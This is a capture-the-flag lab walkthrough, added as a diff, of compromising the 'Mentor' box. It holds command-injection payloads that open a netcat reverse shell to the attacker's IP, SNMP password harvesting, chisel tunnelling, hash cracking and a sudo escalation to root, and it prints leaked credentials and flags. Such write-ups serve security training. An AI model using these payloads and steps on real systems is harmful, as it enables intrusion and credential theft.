@@ -1,0 +1,624 @@
+10.10.11.193
+
+port 80
+
+http://mentorquotes.htb/
+
+add to /etc/hosts
+
+
+
+wfuzz -c -f subdomains.txt -w /home/kali/Desktop/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "http://mentorquotes.htb/" -H "Host: FUZZ.mentorquotes.htb" --hl 9
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://mentorquotes.htb/
+Total requests: 100000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+
+000000040:   404        0 L      2 W        22 Ch       "api" 
+
+
+add api.mentorquotes.htb to hosts
+
+curl http://api.mentorquotes.htb/
+{"detail":"Not Found"} 
+
+looks like json (rest apis?)
+
+
+try fuzzing with wfuzz to find api endpoints
+
+
+wfuzz -c -f apis_fuzzing.txt -w /home/kali/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt   -u "http://api.mentorquotes.htb/FUZZ" --hc 404
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://api.mentorquotes.htb/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+
+000000090:   200        30 L     62 W       969 Ch      "docs"                                                                                                                                                                     
+000000202:   307        0 L      0 W        0 Ch        "users"                                                                                                                                                                    
+000000259:   307        0 L      0 W        0 Ch        "admin"                                                                                                                                                                    
+000000687:   307        0 L      0 W        0 Ch        "quotes"                                                                                                                                                                   
+000010386:   200        27 L     52 W       772 Ch      "redoc"    
+
+
+http://api.mentorquotes.htb/docs
+
+there is swagger api page with a lot of apis and schemas for requests
+
+
+the first api is /auth/login 
+and the credentials for the example are already working:
+
+{
+  "email": "user@example.com",
+  "username": "string",
+  "password": "stringst"
+}
+
+this give an auth string:
+
+"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSJ9.RPFh7ue64oOZBnyDFY0T7yFau51EHj0drU7cjWHDdyY"
+
+
+from server response I have header:
+
+server: uvicorn 
+
+and on the /docs endpoint I can find that the site owner is
+james
+james@mentorquotes.htb
+
+I can't access /admin endpoint 
+
+the token I received after login is a jwt token I can analyze through
+
+jwt.io
+
+https://jwt.io/#debugger-io?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSJ9.hcoeNI8um6b7wTWMRoFhbnOroCXEYVCxNyhr-naG0Mc
+
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+
+{
+  "username": "string",
+  "email": "user@example.com"
+}
+
+
+I can try to access /admin and /users using this user jwt
+
+It doesn't work, it requires an administrator user, which should be james
+
+I tried crafting the jwt token changing only internal data but obv it doesn't work and gives Internal Server Error because the validation part is not correct
+
+I could try to create a user with same email/username (I don't know which of these must be unique so maybe I could reuse one of these)
+then if the check on the apis is wrong (it checks the non-unique parameter to see if the user is an admin or not) I will be able to access anyway
+
+It lets me create BOTH:
+
+{"id":7,"email":"james@mentorquotes.htb","username":"string2"}  
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZzIiLCJlbWFpbCI6ImphbWVzQG1lbnRvcnF1b3Rlcy5odGIifQ.VCGDmNvOxvdMw5TIaMuceBvxzZiAOOOuwCz21j1Kayg
+
+{"id":8,"email":"prova@example.com","username":"james"}
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJwcm92YUBleGFtcGxlLmNvbSJ9.82iYrTmpyxhnXs3Ifxf-1qU7eT0rJdbPCu8tdh82ofU
+
+so the pair of email and username must be unique 
+
+Now I can try both to see if there is a problem in the authentication of the admin user
+
+not workigng
+
+try with 
+
+{
+  "email": "prova@mentorquotes.htb",
+  "username": "james",
+  "password": "password"
+}
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJwcm92YUBtZW50b3JxdW90ZXMuaHRiIn0.YSNgutVGIkeYeyj22sQJq2uFFgIwzEW-YpfTHaXUKg4
+
+nothing
+
+I try to enumerate udp and find snmp port open
+
+PORT    STATE         SERVICE
+68/udp  open|filtered dhcpc
+161/udp open          snmp
+
+
+so I use snmpbrute and snmpwalk to enumerate
+
+python3 snmpbrute.py -t 10.10.11.193
+
+found v2c internal and v2c public
+
+snmpwalk -c public -v2c -t 10 10.10.11.193
+nothing interesting
+
+snmpwalk -c internal  -v2c -t 10 10.10.11.193
+found:
+iso.3.6.1.2.1.25.4.2.1.5.2040 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
+
+
+maybe this is james password? yes
+
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
+
+now I can access /users endpoint
+
+
+HTTP/1.1 201 Created
+Date: Wed, 18 Jan 2023 13:58:39 GMT
+Server: uvicorn
+content-length: 550
+content-type: application/json
+Connection: close
+
+[{"id":1,"email":"james@mentorquotes.htb","username":"james"},{"id":2,"email":"svc@mentorquotes.htb","username":"service_acc"},{"id":4,"email":"user@example.com","username":"string"},{"id":5,"email":"esteesunejemplo@example.com","username":"ejemplodeusu"},{"id":6,"email":"prova@example.com","username":"prova"},{"id":7,"email":"james@mentorquotes.htb","username":"string2"},{"id":8,"email":"prova@example.com","username":"james"},{"id":9,"email":"prova@mentorquotes.htb","username":"james"},{"id":10,"email":"j@mentorquotes.htb","username":"james"}]
+
+excluding all the ones I created the accounts are:
+
+{"id":1,"email":"james@mentorquotes.htb","username":"james"},
+{"id":2,"email":"svc@mentorquotes.htb","username":"service_acc"},
+{"id":4,"email":"user@example.com","username":"string"},
+
+
+and /admin
+
+
+GET /admin/ HTTP/1.1
+Host: api.mentorquotes.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
+Referer: http://api.mentorquotes.htb/admin
+
+
+
+
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 14:01:41 GMT
+Server: uvicorn
+content-length: 83
+content-type: application/json
+Connection: close
+
+{"admin_funcs":{"check db connection":"/check","backup the application":"/backup"}}
+
+
+
+so there are other 2 endpoints
+
+/check
+/backup
+
+which are inside admin/
+
+ /admin/check
+ /admin/backup
+
+/admin/check
+
+{"details":"Not implemented yet!"}
+
+/admin/backup
+
+{"detail":"Method Not Allowed"}
+
+so GET is not allowed, I try POST
+
+{"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]}
+
+
+I try to add a body {} and get
+
+{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]}
+
+so I have to add "path"
+
+my body is:
+
+{
+	"path":"prova"
+}
+
+response is:
+
+{"INFO":"Done!"}
+
+
+
+
+Now it looks like "path" is the path where the backup is executed the only thing I can do is to try to inject some commands 
+
+I don't think I will receive a response back so I could try with sleep or with web requests to my webserver
+
+
+sleep didn't work (probably get executed in a new shell/thread)
+
+curl didn't work
+
+wget works and I get a request
+
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+10.10.11.193 - - [18/Jan/2023 09:26:14] code 404, message File not found
+10.10.11.193 - - [18/Jan/2023 09:26:14] "GET /app_backkup.tar HTTP/1.1" 404 -
+
+
+POST /admin/backup HTTP/1.1
+Host: api.mentorquotes.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
+Connection: close
+Content-Length: 59
+
+{
+	"path": "backup;wget http://10.10.16.2:8000"          
+}
+
+
+Now I have to get a reverse shell
+
+
+If I send 
+
+{
+	"path": "backup; wget http://10.10.16.2:8000/prova.php"
+}
+
+I get the request 
+
+10.10.11.193 - - [18/Jan/2023 09:37:33] "GET /prova.php/app_backkup.tar HTTP/1.1" 404 -
+
+so I need to add another ; at the end to have a clean command injection:
+
+{
+	"path": "backup; wget http://10.10.16.2:8000/prova.php;"          
+}
+
+10.10.11.193 - - [18/Jan/2023 09:37:50] "GET /prova.php HTTP/1.1" 404 -
+
+
+POST /admin/backup HTTP/1.1
+Host: api.mentorquotes.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
+Connection: close
+Content-Length: 66
+
+{
+	"path": "backup; nc 10.10.16.2 9001 -e sh ;"          
+}
+
+
+
+
+nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.193] 36357
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+ls -lart /
+total 172
+drwxr-xr-x    1 root     root          4096 Jun  8  2022 bin
+drwxr-xr-x    1 root     root          4096 Jun  8  2022 lib
+drwxr-xr-x    1 root     root          4096 Nov 10 16:00 usr
+drwxr-xr-x    2 root     root          4096 Nov 10 16:00 srv
+drwxr-xr-x    2 root     root          4096 Nov 10 16:00 sbin
+drwxr-xr-x    2 root     root          4096 Nov 10 16:00 run
+drwx------    2 root     root          4096 Nov 10 16:00 root
+drwxr-xr-x    2 root     root          4096 Nov 10 16:00 opt
+drwxr-xr-x    2 root     root          4096 Nov 10 16:00 mnt
+drwxr-xr-x    5 root     root          4096 Nov 10 16:00 media
+drwxr-xr-x    1 root     root          4096 Nov 10 16:00 home
+drwxr-xr-x    1 root     root          4096 Nov 10 16:01 var
+drwxr-xr-x    3 root     root          4096 Dec 11 08:18 API
+-rw-r--r--    1 root     root        101888 Dec 11 08:26 app_backkup.tar
+dr-xr-xr-x   13 root     root             0 Jan 17 16:50 sys
+dr-xr-xr-x  320 root     root             0 Jan 17 16:50 proc
+drwxr-xr-x    1 root     root          4096 Jan 17 16:50 etc
+drwxr-xr-x    5 root     root           340 Jan 17 16:50 dev
+-rwxr-xr-x    1 root     root             0 Jan 17 16:50 .dockerenv
+drwxr-xr-x    1 root     root          4096 Jan 17 16:50 ..
+drwxr-xr-x    1 root     root          4096 Jan 17 16:50 .
+drwxrwxrwt    1 root     root          4096 Jan 18 14:33 tmp
+drwxr-xr-x    1 root     root          4096 Jan 18 14:44 app
+
+
+
+
+
+I have root account...but in a container
+
+in /app
+
+
+cat db.py
+import os
+
+from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
+from sqlalchemy.sql import func
+from databases import Database
+
+# Database url if none is passed the default one is used
+DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
+
+# SQLAlchemy for quotes
+engine = create_engine(DATABASE_URL)
+metadata = MetaData()
+quotes = Table(
+    "quotes",
+    metadata,
+    Column("id", Integer, primary_key=True),
+    Column("title", String(50)),
+    Column("description", String(50)),
+    Column("created_date", DateTime, default=func.now(), nullable=False)
+)
+
+# SQLAlchemy for users
+engine = create_engine(DATABASE_URL)
+metadata = MetaData()
+users = Table(
+    "users",
+    metadata,
+    Column("id", Integer, primary_key=True),
+    Column("email", String(50)),
+    Column("username", String(50)),
+    Column("password", String(128) ,nullable=False)
+)
+
+
+# Databases query builder
+database = Database(DATABASE_URL)
+
+
+
+postgresql://postgres:postgres@172.22.0.1/mentorquotes_db
+
+I can try to access the db from the container 
+
+in admin.py
+
+DATABASE_URL = os.getenv('DATABASE_URL', 'postgresql://postgres:postgres@192.168.1.4/hello_fastapi_dev')
+
+
+jwt secret:
+
+SECRET =  os.getenv('SECRET', 'secret123')
+
+I don't have  away to connect to db from inside (no psql)
+
+in env:
+
+SECRET=76dsf761g31276hjgsdkahuyt123
+
+
+cd /home/svc
+ls -lart
+total 28
+-rw-r--r--    1 1001     1001           807 Jun  7  2022 .profile
+-rw-r--r--    1 1001     1001          3771 Jun  7  2022 .bashrc
+drwx------    3 1001     1001          4096 Jun 12  2022 .cache
+drwxrwxr-x    5 1001     1001          4096 Jun 12  2022 .local
+lrwxrwxrwx    1 root     root             9 Nov 10 14:28 .bash_history -> /dev/null
+drwxr-xr-x    1 root     root          4096 Nov 10 16:00 ..
+drwxr-x---    4 1001     1001          4096 Nov 11 17:41 .
+-rw-r-----    1 root     1001            33 Jan 18 15:27 user.txt
+cat user.txt
+6520a3388f7e490073983506c936a125
+
+
+
+looking at snmpwalk output 
+
+/usr/local/bin/login.sh -proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432
+
+
+I can use chisel to forward port to my attacker machine and get access to postgres db 
+
+on attacker:
+
+./chisel server --port 8888 --reverse
+
+on target:
+
+./chisel client -v 10.10.16.2:8888 R:5432:172.22.0.1:5432
+
+then use psql to connect to db 
+
+psql -h 127.0.0.1 -p 5432 -d mentorquotes_db -U postgres
+
+
+ERROR:  syntax error at or near "SELECT"
+LINE 2: SELECT * FROM users;
+        ^
+mentorquotes_db=# SELECT * FROM users;
+ id |         email          |  username   |             password             
+----+------------------------+-------------+----------------------------------
+  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
+  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
+(2 rows)
+
+
+
+now I can crack the hashes and I found 
+
+└─$ hashcat -m 0 hash_found /usr/share/wordlists/rockyou.txt
+
+
+53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani
+
+i try this pwd with ssh on host machine:
+
+
+ssh svc@mentorquotes.htb          
+svc@mentorquotes.htb's password: 
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jan 18 04:46:37 PM UTC 2023
+
+  System load:                      0.1689453125
+  Usage of /:                       65.5% of 8.09GB
+  Memory usage:                     17%
+  Swap usage:                       0%
+  Processes:                        253
+  Users logged in:                  0
+  IPv4 address for br-028c7a43f929: 172.20.0.1
+  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
+  IPv4 address for br-3d63c18e314d: 172.21.0.1
+  IPv4 address for br-7d5c72654da7: 172.22.0.1
+  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.193
+  IPv6 address for eth0:            dead:beef::250:56ff:feb9:b8e
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
+svc@mentor:~$ id
+uid=1001(svc) gid=1001(svc) groups=1001(svc)
+svc@mentor:~$ cat user.txt 
+b76273ae6e04dff627d3c4bf5564da65
+
+
+(another user flag??)
+
+can't run sudo 
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+Debian-snmp:x:114:119::/var/lib/snmp:/bin/false
+svc:x:1001:1001:,,,:/home/svc:/bin/bash
+james:x:1000:1000:,,,:/home/james:/bin/bash
+fwupd-refresh:x:115:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+
+
+probably will have to escalate to james first
+
+no suid files
+
+can't use docker 
+
+try to look for other passwords like before
+
+
+grep -iR password /etc 2>/dev/null 
+
+found something:
+
+
+/etc/snmp/snmpd.conf:createUser bootstrap MD5 SuperSecurePassword123__ DES
+
+
+try to login as root and as james with this password SuperSecurePassword123__
+
+It was James password:
+
+svc@mentor:~$ su - james
+Password: 
+james@mentor:~$ id
+uid=1000(james) gid=1000(james) groups=1000(james)
+james@mentor:~$ pwd
+/home/james
+james@mentor:~$ ll
+total 20
+drwxr-x--- 3 james james 4096 Nov 10 14:27 ./
+drwxr-xr-x 4 root  root  4096 Jun 10  2022 ../
+lrwxrwxrwx 1 root  root     9 Nov 10 14:27 .bash_history -> /dev/null
+-rw-r--r-- 1 james james 3771 Jun 10  2022 .bashrc
+drwx------ 2 james james 4096 Jun 10  2022 .cache/
+-rw-r--r-- 1 james james  807 Jun 10  2022 .profile
+
+
+Now I have to escalate again
+
+james@mentor:~$ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on mentor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User james may run the following commands on mentor:
+    (ALL) /bin/sh
+
+james can execute /bin/sh with sudo so basically everythin
+
+james@mentor:~$ sudo /bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+6d8ad550afd0dc4bbe37e979db60690c
+
